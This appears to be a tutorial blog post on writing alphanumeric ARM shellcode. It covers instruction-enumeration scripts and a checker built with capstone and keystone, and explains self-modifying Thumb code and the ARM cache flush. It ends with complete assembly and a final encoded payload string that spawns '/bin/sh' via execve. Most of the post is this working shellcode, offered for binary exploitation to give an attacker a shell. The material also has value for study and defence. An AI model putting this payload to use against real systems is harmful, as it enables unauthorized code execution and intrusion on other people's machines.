---
title: Arm Alphanumeric Shellcode
updated: 2018-03-15 19:11:19
---

- [Alphanumeric ARM Shellcode](#org3909a5f)


<a id="org3909a5f"></a>

# Alphanumeric ARM Shellcode

Shellcode is a piece of code that is used as payload in binary exploitation . It is called a shellcode because for most of the time it is used create shell session to the attacker . The process of creating shellcode is that we write the required code in assembly language and this is coveted to binary by assembling these instructions and this is used . And with a security vulnerability we can make the software execute this code thus giving us access to the machine . Some times these shellcode should pass thought many filters due to the method how the data is read or there might be restriction on the possible characters that can be given as input to the program , for example if the program reads the input as command line argument the shellcode should not contain null characters because the string is terminated by a null and the program will only get the values till that position .

An alphanumeric shellcode should only have alphanumeric characters in it . Most of the input filed will accept this input thus this shellcode have a higher success rate that it will be accepted by the program . We will be creating a shellcode for ARM Architecture

So lets begin ,

We can use capstone to brute all the possible instructions that can be used in both arm and thumb mode . This was useful a couple of time

```python

from capstone import *
from itertools import permutations

VALID = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

THUMB = False

if THUMB:
    md = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
else:
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)

for j in permutations(VALID,4):
    for i in md.disasm(''.join(j), 0x1000):
        print("%s:\t%s\t%s" %(''.join(j), i.mnemonic, i.op_str))
```

The `phrack` [Issue 66 Article 12](http://phrack.org/issues/66/12.html) `Alphanumeric RISC ARM Shellcode` by Yves Younan and Pieter Philippaerts was really help full . There is also [updated](http://amnesia.gtisc.gatech.edu/~moyix/CCS_09/docs/p11.pdf) version of this paper by the same person

Then i needed a way to check whether an instruction is alphanumeric or not and we need to generate the shellcode .

```python

from keystone import *
from termcolor import colored

# ARM Aphanumeric Shellcode Checker

THUMB = True

CODE = '''
adds r1 , 0x41
'''

CODE = CODE.split('\n')
 
shellcode = []

print colored("-"*0x20,'white')
try:
  # Initialize engine in X86-32bit mode
  if THUMB:
    ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
  else:
    ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)
  for i in CODE:
    encoding, count = ks.asm(i)
    if encoding != None :
        encoding = list(encoding)
        for j in encoding:
            shellcode.append(str('\\'))
            shellcode.append(str('x'))
            shellcode.append(hex(j)[2:])
            if chr(j) not in "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz":
                print colored(  str(j) ,'red' ,),
            else:
                print colored(
                  str(j) ,'green' ,),
        print colored("\t->\t%s " %(i),'blue')
    

except KsError as e:
  print("ERROR: %s" %e)

print(''.join(shellcode))
```

I basically checks whether the instruction is alphanumeric or not and prints the result with colors ;) .

```nasm
$ python test.py
--------------------------------
65 49   ->      adds r1 , 0x41 
\x41\x31
```

There was a Alphanumeric shellcode in the phrack article which did not work for me , The code crashes on STM instruction which is used to push some values to the sack . Later these values are poped from the stack and loaded to the register . The thing is ,in ARM the argument to a syscall is passed through the registers r0-r3 and the syscall number is in r7 register . So loading values to these registers are really important the only instruction that can be used to manipulate this is LDM and STM , load multiple and store multiple in ARM mode . The case is different in THUMB mode. In thumb mode we can manipulate these registers . I am talking in the context that these instruction should produce alphanumeric characters .

To get a shell we need to call the execve syscall with the `svc` instruction which is not a alphanumeric instruction , the solution is to write the correct hex at that location at run time ie , we need to write a self modifying code . And there is instruction cache in ARM which is not invalidated even when instruction in memory is changed. In x86 this happens automatically . Therefor we have to flush the cache manually

```nasm
MOV   r0 , #0
MOV   r1 , #−1
MOV   r2 , #0
SWI 0x9F0002
```

This code can be used to flush the cache . Actually the `0x9f0002` will not be alphanumeric , but the 0x9f0002 is treated as data passed to the interrupt so we can give any number which gives alphanumeric code then later change it to the required value at runtime .

The above instruction is for ARM mode , and We can only manipulate the value of r0-r3 register in THUMB mode , So we have to copy the required value to the correct register in THUMB mode then switch to ARM mode to execute this instruction that will flush the cache the again return to THUMB mode and call the syscall with `svc` instruction .

All the modification of code should be done before the flush is called.

Lets assume that r0 register contains the value 0

```nasm
muls r1 , r0      # r1=0
muls r2 , r0      # r2=0
mov r0 , pc       # r0=pc

muls r5, r2       #r5=0
adds r1, 0x43
subs r1, 0x41
adds r5, 0x41
strb r1 ,[ r0 , r5 ]

muls r5 , r2
muls r1 , r2
adds r5, 0x4d
strb r1 ,[ r0 , r5 ]
```

`strb` instruction can be used to copy a byte to the required location , r0 is initialized with the address of pc we use this as a base address to write the code . we have to use values in the alphanumeric range to produce the required value with some arithmetic operation. In the above code stores 0x2 at the location r0+0x41 and 0x0 at location r0+0x4d . like this we have to modify all the required values .

To jump from THUMB mode to ARM mode we can use `bx pc` instruction and from ARM to THUMB we can use `bx r6` so we need to load the address of the location we need to jump before that .

So we will first jump to thumb mode change the code , set the correct register values to flash the cache then jump to arm mode flush the cache change to thumb mode set "/bin/sh" and call execve syscall .

This is the finished shellcode , It is not that optimized but does the job .

```nasm
 # we are asuming that r0=0
.code 16
	muls r1 , r0  # r1=0
	muls r2 , r0  # r2=0
	mov r0 , pc   # r0=pc

	muls r5, r2      # the following code are for inserting
	adds r1, 0x43    # swi and bx instructions
	subs r1, 0x41    # 2 0 159 239     ->      swi 0x9f0002
    adds r5, 0x4d    # 22 255 47 225   ->      bx r6
	adds r5, 0x41  
	strb r1 ,[ r0 , r5 ]

	muls r5 , r2
	muls r1 , r2
	adds r5, 0x4d
	adds r5, 0x42
	strb r1 ,[ r0 , r5 ]

	muls r5, r2
	muls r1, r2
	adds r1, 0x61
	adds r1, 0x70
	subs r1, 0x32
	adds r5, 0x4d
	adds r5, 0x43
	strb r1 ,[ r0 , r5 ]

	muls r5, r2
	adds r1, 0x50
	adds r5, 0x4d
	adds r5, 0x44
	strb r1 ,[ r0 , r5 ]


	muls r5, r2
	muls r1, r2
	adds r1, 0x61
	subs r1, 0x4b
	adds r5, 0x4d
	adds r5, 0x45
	strb r1 ,[ r0 , r5 ]

	muls r5, r2
	muls r1, r2
	adds r1, 0x7a
	adds r1, 0x41
	adds r1, 0x44
	adds r5, 0x4d
	adds r5, 0x46
	strb r1 ,[ r0 , r5 ]

	muls r5, r2
	muls r1, r2
	adds r1, 0x7a
	subs r1, 0x4b
	adds r5, 0x4d
	adds r5, 0x47
	strb r1 ,[ r0 , r5 ]

	muls r5, r2
	adds r1, 0x70
	adds r1, 0x42
	adds r5, 0x4d
	adds r5, 0x48
	strb r1 ,[ r0 , r5 ]

	muls r5, r2           # this block write 0xdf 
	adds r1, 0x41         # which is the opcode for svc instruction
	subs r1, 0x43
	adds r5, 0x39
	adds r5, 0x41
	adds r5, 0x4d
	strb r1 ,[ r0 , r5 ]

	muls r1 , r2          # set r6 regiseter with correct location
	adds r1, 0x41
	subs r1, 0x42
	negs r6 , r1
	muls r6 , r0
	adds r6 , 0x4d
	adds r6 , 0x4a

	muls r0,r2           # r0=0
	muls r1,r2        
	adds r1 , 0x41       
	subs r1 , 0x42       # r1=-1

	bx pc 
	adds r7,0x41

.byte 0x41 0x41 0x41 0x41    # these bytes are modified to swi 0x9f0002
.byte 0x41 0x41 0x41 0x41    # bx r6

	muls r2 , r0
	mov r0 , pc
	muls r5 , r2
	muls r1 , r2

	adds r1 , 100           # AbinAshA is changed to /bin/sh
	subs r1 , 53
	adds r5 , 48           
	strb r1 ,[ r0 , r5 ]

	muls r5 , r2
	adds r5 , 52
	strb r1 , [ r0 , r5]

	muls r5 , r2
	adds r5 , 55
	strb r2 , [ r0 , r5]

	muls r1,r2
	adds r1 , 0x50
	subs r1 , 0x51
	negs r7 , r1     # r7=1
	muls r1,r2
	adds r1, 0x4c
	subs r1 , 0x41   # r1=0xb
	muls r7 , r1     # r7=0xb
	adds r0, 48
	muls r1 , r2

.byte 0x41 0x41    # svc instruction 
.ascii "AAAAAbinAshA"
```

Final shellcode

> "\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41"

Happy Hacking !!